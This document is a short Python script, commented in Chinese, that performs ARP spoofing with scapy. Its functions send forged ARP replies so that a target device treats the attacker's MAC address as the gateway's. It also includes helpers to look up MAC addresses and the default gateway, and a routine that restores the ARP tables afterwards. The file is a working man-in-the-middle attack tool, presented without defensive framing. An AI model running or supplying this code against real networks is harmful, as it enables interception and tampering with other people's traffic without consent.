from scapy.all import ARP, Ether, send ,srp
import socket
import subprocess
import platform


def arp_spoof(target_ip, spoof_ip):
    """
    发送ARP响应包，欺骗目标设备将网关的IP地址解析为攻击者的MAC地址。
    :param target_ip: 目标设备的IP地址
    :param spoof_ip: 要欺骗的IP地址（通常是网关的IP地址）
    """
    # 创建ARP响应包
    arp_response = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    
    # 发送ARP响应包
    send(arp_response, verbose=0)
    print(f"Sent ARP spoof packet to {target_ip} saying {spoof_ip} is at {arp_response.hwsrc}")

def get_mac(ip_address):
    # 发送ARP请求
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=0)[0]

    # 检查是否收到了响应
    if answered_list:
        # 返回第一个响应的MAC地址
        return answered_list[0][1].hwsrc
    else:
        # 没有收到响应，可以抛出异常或返回None
        print(f"No response received for ARP request to {ip_address}")
        return None


def restore(target_ip, gateway_ip):
    """
    恢复目标设备和网关的ARP表。
    :param target_ip: 目标设备的IP地址
    :param gateway_ip: 网关的IP地址
    """
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(arp_response, count=5, verbose=0)
    print(f"Restored ARP tables for {target_ip} and {gateway_ip}")

import netifaces
import socket

def get_gateway_ip():
    gateways = netifaces.gateways()

    ip = gateways['default']
    ip = next(iter(ip))

    return gateways['default'][ip][0]